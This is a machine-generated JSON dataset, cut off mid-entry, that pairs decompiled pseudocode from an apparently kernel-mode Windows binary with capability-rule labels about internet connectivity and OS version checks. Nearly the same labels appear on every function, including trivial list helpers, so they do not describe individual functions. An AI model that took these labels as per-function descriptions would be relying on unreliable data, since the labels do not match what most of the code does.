{
    "00015a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00015a50(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint *arg_8h_00;\n    uint var_e4h;\n    uint var_e0h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_28h;\n    uint var_24h;\n    \n    iVar1 = fcn.00034c90();\n    iVar2 = fcn.0001b770(0xb1c5a90c, 1, 0);\n    if (iVar2 != 1) {\n        fcn.0001d460();\n        fcn.00034b10(0xb1c5b0c8, 0x104);\n        var_84h = fcn.0001e7a0();\n        fcn.0003da30();\n        uVar3 = fcn.0003dbd0();\n        var_84h = fcn.00032230(uVar3 & 0xffffff00 | arg_8h & 0xff);\n        if (var_84h == 0) {\n            fcn.00078532(*(*0xb1c59660 + 0x1c), 0);\n        }\n        if (iVar1 < 0x1b) {\n            var_84h = fcn.0004ee40();\n            var_84h = fcn.00051360();\n        }\n        else {\n            var_84h = fcn.00051360();\n        }\n        if (var_84h == 0) {\n            fcn.0003de00();\n            fcn.0004b5c0();\n        }\n        *0xb1c68784 = *(*0xb1c59660 + 4);\n        *0xb1c6888c = 0xb1beaa50;\n        *0xb1c688a0 = 1;\n        *0xb1c688a4 = *0xb1c59660;\n        *0xb1c68788 = *0xb1bde338;\n        *0xb1c6878c = *0xb1bde33c;\n        var_28h = (-(arg_8h != 0) & 0xffffff8b) + 0x78;\n        var_84h = -1;\n        fcn.0002bbe0(&fcn.00015a50::var_80h, 0x52);\n        fcn.0002bc10(&fcn.00015a50::var_e0h, 0x52);\n        do {\n            iVar2 = fcn.00035c70(&fcn.00015a50::var_80h, &fcn.00015a50::var_24h);\n            if (iVar2 == 0) {\n                arg_8h_00 = &fcn.00015a50::var_e0h;\n                var_84h = fcn.00023d90(arg_8h_00, 0);\n                if (var_84h == 0) break;\n            }\n            arg_8h_00 = 0x15bc5;\n            fcn.000209a0(1000);\n            iVar2 = var_28h + -1;\n            bVar4 = var_28h != 0;\n            var_28h = iVar2;\n        } while (bVar4);\n        if (0x1a < iVar1) {\n            fcn.00046790(arg_8h_00);\n        }\n        fcn.0006be90();\n        var_84h = fcn.0001d850();\n        fcn.000569c0();\n        fcn.00018ed0();\n        fcn.0001de60();\n        fcn.00043240();\n        fcn.00048d70();\n    }\n    return 0;\n}\n",
        "token_count": 865
    },
    "00015c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00015c20(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00034c90(param_1);\n    if (*0xb1c5a90c != 0) {\n        fcn.00048e10();\n        fcn.000435c0(0);\n        fcn.00018f30();\n        fcn.00056b90();\n        fcn.0004b660();\n        if (iVar1 < 0x1b) {\n            fcn.000514d0();\n            fcn.0004f0a0();\n        }\n        else {\n            fcn.0003dd20();\n            fcn.000514d0();\n        }\n        fcn.0003da60();\n        fcn.0001d8e0();\n        fcn.0006bf20();\n        if (0x1a < iVar1) {\n            fcn.000467f0();\n        }\n        fcn.00024380();\n        fcn.00032700();\n        fcn.0001eb20();\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00015ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00015ca0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h._0_2_ = 0xa8;\n    var_24h._2_2_ = 0xaa;\n    var_20h = 0xb1bde340;\n    var_8h._0_2_ = 0x20;\n    var_8h._2_2_ = 0x22;\n    var_4h = 0xb1bde3ec;\n    var_2ch = 0xffffffff;\n    var_48h = fcn.0001b3b0();\n    if (var_48h == 0) {\n        var_18h = *(*0xb1c59660 + 4);\n        var_14h = *(*0xb1c59660 + 8);\n        var_10h = *(*0xb1c59660 + 0xc);\n        var_ch = *(*0xb1c59660 + 0x10);\n        var_48h = fcn.00062fc0(&var_18h);\n        if (var_48h == 0) {\n            fcn.0001d260();\n            if (arg_ch != '\\0') {\n                fcn.00016670(arg_8h);\n            }\n            var_44h = 0x18;\n            var_40h = 0;\n            var_38h = 0x40;\n            var_3ch = &var_24h;\n            var_34h = 0;\n            var_30h = 0;\n            iVar1 = fcn.0007854a(&var_1ch, 2, &var_44h);\n            if (iVar1 == 0) {\n                fcn.0007853e(var_1ch, &var_8h, 0, 4, &var_2ch, 4);\n                fcn.00078544(var_1ch);\n            }\n            var_48h = fcn.00016000();\n            if (((var_48h == 0) && (var_48h = fcn.0005c850(*(*0xb1c59660 + 0xc), 0xb1bde410, &var_28h),  var_48h == 0))\n               && (var_48h = fcn.000631a0(var_28h, 0xb1be2e60, 0xb1c5a910),  var_48h == 0)) {\n                fcn.00063a90(*0xb1c5a910);\n            }\n        }\n    }\n    if (var_48h != 0) {\n        fcn.00015e20();\n    }\n    return var_48h;\n}\n",
        "token_count": 753
    },
    "00015e60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00015e60(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_10h = fcn.00034c90();\n    uVar3 = extraout_ECX & 0xffffff00 | arg_20h & 0xff;\n    iVar2 = arg_ch;\n    pcVar1 = fcn.000639f0(arg_8h);\n    var_8h = (*pcVar1)(arg_8h, iVar2, arg_10h, arg_14h, arg_18h, arg_1ch, uVar3, arg_24h);\n    if (((var_8h == 0) && (arg_ch != 0)) && (*(arg_ch + 0x20) != 0)) {\n        uVar3 = *(arg_ch + 0x1c) >> 1;\n        for (var_4h = *(arg_ch + 0x20) + -2 + uVar3 * 2; (*var_4h != 0x5c && (*(arg_ch + 0x20) <= var_4h));\n            var_4h = var_4h + -1) {\n        }\n        var_4h = var_4h + 1;\n        var_ch = uVar3 - (var_4h - *(arg_ch + 0x20) >> 1);\n        iVar2 = fcn.00078538(var_4h, 0xb1bde420, var_ch);\n        if ((iVar2 == 0) || (iVar2 = fcn.00078538(var_4h, 0xb1bde42c, var_ch),  iVar2 == 0)) {\n            if (var_10h < 0x1b) {\n                fcn.00052b90(0);\n            }\n        }\n        else {\n            iVar2 = fcn.00078538(var_4h, 0xb1bde434, var_ch);\n            if (((((iVar2 == 0) || (iVar2 = fcn.00078538(var_4h, 0xb1bde440, var_ch),  iVar2 == 0)) ||\n                 (iVar2 = fcn.00078538(var_4h, 0xb1bde44c, var_ch),  iVar2 == 0)) ||\n                (iVar2 = fcn.00078538(var_4h, 0xb1bde458, var_ch),  iVar2 == 0)) &&\n               (iVar2 = fcn.0001a8e0(&var_18h, 0xb1be9e40, 0),  iVar2 == 0)) {\n                fcn.00037270(&var_18h, 0);\n                fcn.00037220(&var_18h);\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 745
    },
    "00016000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00016000(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00036f50(0xb1c5a914);\n    var_8h = fcn.0005c850(*(*0xb1c59660 + 0xc), 0xb1bde46c, &var_4h);\n    if ((var_8h == 0) && (var_8h = fcn.000631a0(var_4h, 0xb1be34e0, 0xb1c5a924),  var_8h == 0)) {\n        fcn.00063a90(*0xb1c5a924);\n    }\n    return var_8h;\n}\n",
        "token_count": 173
    },
    "00016090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00016090(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = fcn.00035230(0x10);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        puVar1[1] = arg_8h;\n        puVar1[2] = arg_ch;\n        puVar1[3] = arg_10h;\n        fcn.00037150(0xb1c5a914, &var_4h, 1);\n        *puVar1 = *0xb1c5a920;\n        *0xb1c5a920 = puVar1;\n        fcn.00037180(0xb1c5a914, &var_4h, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 231
    },
    "00016110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00016110(int32_t arg_8h)\n\n{\n    int32_t **var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    fcn.00037150(0xb1c5a914, &var_8h, 1);\n    var_ch = 0xb1c5a920;\n    do {\n        if (*var_ch == NULL) {\ncode_r0x00016170:\n            fcn.00037180(0xb1c5a914, &var_8h, 1);\n            return;\n        }\n        if ((*var_ch)[1] == arg_8h) {\n            var_4h = *var_ch;\n            *var_ch = **var_ch;\n            fcn.00035330(var_4h);\n            goto code_r0x00016170;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 206
    },
    "00016190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00016190(uint arg_8h, uint arg_ch)\n\n{\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00078550(&var_10h, arg_8h);\n    var_8h = (**0xb1bde2f0)(&var_10h, 0, &var_4h, arg_ch);\n    if (var_8h == 0) {\n        (**0xb1bde2e8)();\n        (**0xb1bde2e4)();\n    }\n    return var_8h;\n}\n",
        "token_count": 143
    },
    "000161e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000161e0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_ch + 0x60);\n    if (arg_10h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        puVar3 = fcn.00035230(0x2c);\n        if (puVar3 == NULL) {\n            *(arg_ch + 0x18) = 0xc000009a;\n            (**0xb1bde2ec)();\n            uVar2 = 0xc000009a;\n        }\n        else {\n            *puVar3 = *(puVar1 + 0x1c);\n            puVar3[1] = *(puVar1 + 0x20);\n            puVar3[2] = arg_10h;\n            puVar3[3] = arg_14h;\n            puVar3[4] = *(puVar1 + 0x18);\n            puVar3[5] = arg_8h;\n            *(puVar3 + 6) = puVar1[3];\n            *(puVar3 + 0x1a) = *puVar1;\n            *(puVar3 + 0x1b) = puVar1[1];\n            *(puVar3 + 0x19) = puVar1[2];\n            puVar3[7] = *(puVar1 + 4);\n            puVar3[8] = *(puVar1 + 8);\n            puVar3[9] = *(puVar1 + 0xc);\n            puVar3[10] = *(puVar1 + 0x10);\n            *(puVar1 + 0x1c) = 0xb1be32e0;\n            *(puVar1 + 0x20) = puVar3;\n            puVar1[3] = 0xe0;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 484
    },
    "000162e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000162e0(uint arg_8h, int32_t arg_ch, code **arg_10h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    bool bVar3;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(arg_ch + 0x23) = *(arg_ch + 0x23) + -1;\n    *(arg_ch + 0x60) = *(arg_ch + 0x60) + -0x24;\n    puVar1 = *(arg_ch + 0x60);\n    uVar2 = *(puVar1 + 0x14);\n    if (arg_10h[2] == NULL) {\n        var_ch = 0;\n    }\n    else {\n        *(puVar1 + 0x18) = arg_10h[4];\n        *(puVar1 + 0x14) = arg_10h[5];\n        *puVar1 = *(arg_10h + 0x1a);\n        puVar1[1] = *(arg_10h + 0x1b);\n        puVar1[2] = *(arg_10h + 0x19);\n        *(puVar1 + 4) = arg_10h[7];\n        *(puVar1 + 8) = arg_10h[8];\n        *(puVar1 + 0xc) = arg_10h[9];\n        *(puVar1 + 0x10) = arg_10h[10];\n        puVar1[3] = *(arg_10h + 6);\n        *(puVar1 + 0x1c) = *arg_10h;\n        *(puVar1 + 0x20) = arg_10h[1];\n        var_ch = (*arg_10h[2])(arg_10h[5], arg_ch, arg_10h[3]);\n        if (var_ch == -0x3fffffea) {\n            return -0x3fffffea;\n        }\n    }\n    *(puVar1 + 0x1c) = *arg_10h;\n    *(puVar1 + 0x20) = arg_10h[1];\n    *(puVar1 + 0x14) = uVar2;\n    *(arg_ch + 0x23) = *(arg_ch + 0x23) + '\\x01';\n    *(arg_ch + 0x60) = *(arg_ch + 0x60) + 0x24;\n    if (*arg_10h != NULL) {\n        bVar3 = false;\n        if (*(arg_ch + 0x24) == '\\0') {\n            if (*(arg_ch + 0x18) < 0) {\n                if ((*(arg_10h + 6) & 0x80) != 0) {\n                    bVar3 = true;\n                }\n            }\n            else {\n                bVar3 = (*(arg_10h + 6) & 0x40) != 0;\n            }\n        }\n        else {\n            bVar3 = (*(arg_10h + 6) & 0x20) != 0;\n        }\n        if (bVar3) {\n            var_ch = (**arg_10h)(uVar2, arg_ch, arg_10h[1]);\n        }\n    }\n    fcn.00035330(arg_10h);\n    return var_ch;\n}\n",
        "token_count": 759
    },
    "000164e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.000164e0(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    int32_t var_18h;\n    uint *var_14h;\n    code *var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = NULL;\n    var_10h = NULL;\n    var_1dh._0_1_ = '\\x01';\n    stack0xffffffe0 = 0;\n    if ((in_ECX == 0) || (in_EDX == 0)) {\n        pcVar1 = fcn.000639f0(arg_8h);\n        var_8h = (*pcVar1)();\n    }\n    else {\n        *(in_EDX + 0x23) = *(in_EDX + 0x23) + -1;\n        *(in_EDX + 0x60) = *(in_EDX + 0x60) + -0x24;\n        var_24h = in_ECX;\n        if (((*(in_EDX + 0x23) <= *(in_EDX + 0x22)) && ('\\0' < *(in_EDX + 0x23))) &&\n           (var_18h = *(in_EDX + 0x60),  var_18h != 0)) {\n            *(var_18h + 0x14) = in_ECX;\n            fcn.00032e00(&var_24h);\n            *(var_18h + 0x14) = var_24h;\n            fcn.00037150(0xb1c5a914, &var_4h, 0);\n            for (var_14h = *0xb1c5a920; var_14h != NULL; var_14h = *var_14h) {\n                if (var_14h[1] == var_24h) {\n                    var_ch = var_14h[2];\n                    var_10h = var_14h[3];\n                    break;\n                }\n            }\n            fcn.00037180(0xb1c5a914, &var_4h, 0);\n            if ((var_ch != NULL) && (var_8h = (*var_ch)(var_24h, in_EDX, &var_1dh, &var_1dh + 1),  var_1dh == '\\0')) {\n                return var_8h;\n            }\n        }\n        *(in_EDX + 0x23) = *(in_EDX + 0x23) + '\\x01';\n        *(in_EDX + 0x60) = *(in_EDX + 0x60) + 0x24;\n        pcVar1 = fcn.000639f0(arg_8h);\n        var_8h = (*pcVar1)();\n        if (var_10h != NULL) {\n            var_8h = (*var_10h)(var_24h, in_EDX, var_8h, stack0xffffffe0);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 728
    },
    "00016670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00016670(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    int16_t *var_8h;\n    uint var_73ch;\n    uint var_734h;\n    uint *var_730h;\n    uint var_72ch;\n    uint var_724h;\n    uint *var_720h;\n    uint var_718h;\n    uint var_512h;\n    uint var_50ch;\n    uint var_508h;\n    uint var_500h;\n    uint var_4fch;\n    uint32_t var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    int32_t var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    int32_t var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    uint var_4c0h;\n    ushort var_2bah;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_aah;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c458c0;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xfffff8b4;\n    var_4f4h._0_2_ = 8;\n    var_4f4h._2_2_ = 10;\n    var_4f0h = 0xb1bde47c;\n    var_4d0h._0_2_ = 10;\n    var_4d0h._2_2_ = 0xc;\n    var_4cch = 0xb1bde488;\n    var_2b8h._0_2_ = 0x18;\n    var_2b8h._2_2_ = 0x1a;\n    var_2b4h = 0xb1bde494;\n    var_500h._0_2_ = 10;\n    var_500h._2_2_ = 0xc;\n    var_4fch = 0xb1bde4b0;\n    var_20h._0_2_ = 0x12;\n    var_20h._2_2_ = 0x14;\n    var_1ch = 0xb1bde4bc;\n    var_4c8h._0_2_ = 0x14;\n    var_4c8h._2_2_ = 0x16;\n    var_4c4h = 0xb1bde4d0;\n    var_98h._0_2_ = 10;\n    var_98h._2_2_ = 0xc;\n    var_94h = 0xb1bde4e8;\n    fcn.0002bfa0(&var_90h, 100);\n    fcn.00078556(&var_2b0h, 0x104, 0xb1bde4f4, &var_90h);\n    var_aah._0_2_ = 0;\n    fcn.0002bfd0(&var_90h, 100);\n    fcn.00078556(&var_4c0h, 0x104, 0xb1bde514, &var_2b0h, &var_90h);\n    var_2bah = 0;\n    fcn.00078550(&var_aah + 2, &var_2b0h);\n    var_4e8h = 0x18;\n    var_4e4h = 0;\n    var_4dch = 0x40;\n    var_4e0h = &var_aah + 2;\n    var_4d8h = 0;\n    var_4d4h = 0;\n    var_4ech = fcn.0001ec90(&var_50ch, 0xc0000000, &var_4e8h, &var_508h, 0, 2, 0, 2, 0x21, 0, 0);\n    if (var_4ech == 0) {\n        fcn.00078544(var_50ch);\n    }\n    if ((*var_8h == 0) && (*(var_8h + 10) != 0)) {\n        var_4h = 0;\n        (**0xb1bde2e0)(*(var_8h + 10), 8, 1);\n        var_a0h = **(var_8h + 10);\n        var_9ch = (*(var_8h + 10))[1];\n        (**0xb1bde2e0)(var_a0h, var_9ch, 1);\n        fcn.00078550();\n        var_4e8h = 0x18;\n        var_4e4h = 0;\n        var_4dch = 0x40;\n        var_4e0h = &var_aah + 2;\n        var_4d8h = 0;\n        var_4d4h = 0;\n        var_4ech = fcn.0001ec90(&var_50ch, 0x40000000, &var_4e8h, &var_508h, 0, 0x80, 0, 2, 0x60, 0, 0);\n        if (var_4ech == 0) {\n            var_4ech = fcn.00078574(var_50ch, 0, 0, 0, &var_508h, var_a0h, var_9ch, 0, 0);\n            fcn.00078544(var_50ch);\n        }\n        var_4h = 0xffffffff;\n    }\n    iVar2 = fcn.00034c90();\n    var_4f8h = 0x25 < iVar2;\n    fcn.0002bf10(&var_90h, 100);\n    fcn.00078556(&var_718h, 0x104, 0xb1bde520, &var_90h);\n    fcn.00078550(&var_aah + 2, &var_718h);\n    var_4e8h = 0x18;\n    var_4e4h = 0;\n    var_4dch = 0x40;\n    var_4e0h = &var_aah + 2;\n    var_4d8h = 0;\n    var_4d4h = 0;\n    var_4ech = fcn.0001d090(&var_50ch, 0x40000000, &var_4e8h, 0, 0, 0, 0);\n    if (var_4ech == 0) {\n        var_24h = 0;\n        fcn.0001d110(var_50ch, &var_2b8h, 0, 4, &var_24h, 4);\n        var_24h = (-(var_4f8h != 0) & 0xf) + 1;\n        fcn.0001d110(var_50ch, &var_4f4h, 0, 4, &var_24h, 4);\n        if (var_4f8h == 0) {\n            var_24h = 1;\n        }\n        else {\n            var_24h = 2;\n        }\n        fcn.0001d110(var_50ch, &var_4d0h, 0, 4, &var_24h, 4);\n        if (var_4f8h == 0) {\n            fcn.0001d110(var_50ch, &var_500h, 0, 1, 0xb1bde590, 0x20);\n        }\n        if (var_4f8h == 0) {\n            var_730h = &var_4c0h;\n            do {\n                iVar1 = *var_730h;\n                var_730h = var_730h + 2;\n            } while (iVar1 != 0);\n            fcn.0001d110(var_50ch, &var_20h, 0, 1, &var_4c0h, (var_730h - (&var_4c0h + 2) >> 1) * 2 + 2);\n        }\n        else {\n            fcn.0002c000(&var_90h, 100);\n            fcn.00078556(&var_718h, 0x104, 0xb1bde514, &var_2b0h, &var_90h);\n            var_512h._0_2_ = 0;\n            var_720h = &var_718h;\n            do {\n                iVar1 = *var_720h;\n                var_720h = var_720h + 2;\n            } while (iVar1 != 0);\n            fcn.0001d110(var_50ch, &var_20h, 0, 2, &var_718h, (var_720h - (&var_718h + 2) >> 1) * 2 + 2);\n        }\n        if (var_4f8h != 0) {\n            fcn.0001d110(var_50ch, &var_4c8h, 0, 1, 0xb1bde5b0, 0x18);\n            var_24h = 1;\n            fcn.0001d110(var_50ch, &var_98h, 0, 4, &var_24h, 4);\n        }\n        fcn.00078562(var_50ch);\n        fcn.00078544(var_50ch);\n    }\n    *in_FS_OFFSET = var_10h;\n    return;\n}\n",
        "token_count": 2429
    },
    "00016cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00016cf0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_2b8h;\n    uint var_b0h;\n    uint var_ach;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint *var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uchar var_85h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_68h;\n    \n    var_84h._0_2_ = 8;\n    var_84h._2_2_ = 10;\n    var_80h = 0xb1bde5c8;\n    var_78h._0_2_ = 0x68;\n    var_78h._2_2_ = 0x6a;\n    var_74h = 0xb1bde5d8;\n    fcn.0002bfa0(&var_68h, 100);\n    fcn.00078556(&var_2b8h, 0x104, 0xb1bde4f4, &var_68h);\n    fcn.00078550(&var_70h, &var_2b8h);\n    var_a0h = 0x18;\n    var_9ch = 0;\n    var_94h = 0x40;\n    var_98h = &var_70h;\n    var_90h = 0;\n    var_8ch = 0;\n    iVar1 = fcn.0007856e(&var_b0h, 0x10000000, &var_a0h, &var_ach, 0, 0);\n    if (iVar1 == 0) {\n        if (arg_8h != '\\0') {\n            fcn.0002bf70(&var_68h, 100);\n            fcn.00078556(&var_2b8h, 0x104, 0xb1bde644, &var_68h);\n            fcn.00078550(&var_70h, &var_2b8h);\n            var_a0h = 0x18;\n            var_9ch = var_b0h;\n            var_94h = 0x40;\n            var_98h = &var_70h;\n            var_90h = 0;\n            var_8ch = 0;\n            fcn.00078568(&var_a0h);\n        }\n        fcn.0002bfd0(&var_68h, 100);\n        fcn.00078556(&var_2b8h, 0x104, 0xb1bde644, &var_68h);\n        fcn.00078550(&var_70h, &var_2b8h);\n        var_a0h = 0x18;\n        var_9ch = var_b0h;\n        var_94h = 0x40;\n        var_98h = &var_70h;\n        var_90h = 0;\n        var_8ch = 0;\n        fcn.00078568(&var_a0h);\n        if (arg_8h != '\\0') {\n            var_85h = 1;\n            fcn.0007855c(var_b0h, &var_ach, &var_85h, 1, 0xd);\n        }\n        fcn.00078544(var_b0h);\n    }\n    fcn.0002bf10(&var_68h, 100);\n    fcn.00078556(&var_2b8h, 0x104, 0xb1bde520, &var_68h);\n    fcn.00078550(&var_70h, &var_2b8h);\n    var_a0h = 0x18;\n    var_9ch = 0;\n    var_94h = 0x40;\n    var_98h = &var_70h;\n    var_90h = 0;\n    var_8ch = 0;\n    var_a4h = fcn.0007854a(&var_b0h, 0x10000000, &var_a0h);\n    if (var_a4h == 0) {\n        var_a0h = 0x18;\n        var_9ch = var_b0h;\n        var_94h = 0x40;\n        var_98h = &var_84h;\n        var_90h = 0;\n        var_8ch = 0;\n        var_a4h = fcn.0007854a(&var_7ch, 0x10000000, &var_a0h);\n        if (var_a4h == 0) {\n            fcn.0007857a(var_7ch);\n            fcn.00078544(var_7ch);\n        }\n        fcn.0007857a(var_b0h);\n        fcn.00078544(var_b0h);\n    }\n    var_a0h = 0x18;\n    var_9ch = 0;\n    var_94h = 0x40;\n    var_98h = &var_78h;\n    var_90h = 0;\n    var_8ch = 0;\n    var_a4h = fcn.0007854a(&var_b0h, 0x10000000, &var_a0h);\n    if (var_a4h == 0) {\n        fcn.00078562(var_b0h);\n        fcn.00078544(var_b0h);\n    }\n    return;\n}\n",
        "token_count": 1297
    },
    "000170c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
